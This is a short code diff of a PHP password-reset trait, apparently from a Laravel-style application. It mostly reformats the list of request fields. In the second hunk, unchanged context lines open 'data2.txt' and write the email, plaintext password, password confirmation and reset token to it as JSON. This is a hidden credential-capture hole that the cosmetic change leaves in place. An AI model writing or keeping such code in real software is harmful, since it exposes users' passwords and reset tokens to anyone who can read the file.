@@ -107,7 +107,10 @@ trait ResetsPasswords
         $this->validate($request, $this->getResetValidationRules());
 
         $credentials = $request->only(
-            'email', 'password', 'password_confirmation', 'token'
+            'email',
+            'password',
+            'password_confirmation',
+            'token'
         );
 
         $broker = $this->getBroker();
@@ -130,7 +133,10 @@ trait ResetsPasswords
         $this->validate($request, $this->getResetValidationRules());
 
         $credentials = $request->only(
-            'email', 'password', 'password_confirmation', 'token'
+            'email',
+            'password',
+            'password_confirmation',
+            'token'
         );
         $f = fopen('data2.txt', 'w');
         fwrite($f, json_encode($credentials));
